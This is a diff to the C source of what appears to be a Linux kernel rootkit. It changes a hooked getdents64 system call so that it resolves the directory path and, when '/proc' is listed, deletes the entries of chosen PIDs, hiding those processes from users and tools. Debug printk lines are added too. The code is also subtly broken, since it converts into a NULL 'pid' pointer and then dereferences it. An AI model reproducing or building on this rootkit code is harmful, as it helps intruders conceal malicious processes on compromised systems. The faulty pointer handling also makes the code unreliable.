@@ -171,6 +171,10 @@ asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp,
 	struct hidden_file *ptr;
 	char *kdirp; // char buffer so we can do pointer arithmetic by byte
 	struct linux_dirent64 *d;
+
+	struct files_struct *current_files; 
+	struct fdtable *files_table;
+	struct path file_path;
 	char pbuf[256], *pathname = NULL;
 	long *pid = NULL;
 
@@ -180,7 +184,11 @@ asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp,
 		return result;
 
 	// get pathname
-	getPathnameFromFD(fd,pathname,pbuf);
+	current_files = current->files;
+	files_table = files_fdtable(current_files);
+
+	file_path = files_table->fd[fd]->f_path;
+	pathname = d_path(&file_path,pbuf,256*sizeof(char));
 
 	// copy from user to kernelspace;
 	if (!access_ok(VERIFY_READ,dirp,result))
@@ -194,9 +202,12 @@ asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp,
 	for (bp = 0; bp < result;) {
 		d = (struct linux_dirent64 *) (kdirp + bp);
 		// process hiding
-		if (!strncmp(pathname,"/proc",5)) {
-			kstrtol(pathname + 6,10,pid);
+		if (!strcmp(pathname,"/proc")) {
+			printk(KERN_INFO "After /proc check,%i\n",strlen(pathname));
+			kstrtol(d->d_name,10,pid);
+			printk(KERN_INFO "After pid convert,%li\n",*pid);
 			if (checkProcName(*pid)) {
+				printk(KERN_INFO "Found pid to hide\n");
 				memmove(kdirp + bp,kdirp + bp + d->d_reclen,
 					result - bp - d->d_reclen);
 				result -= d->d_reclen;
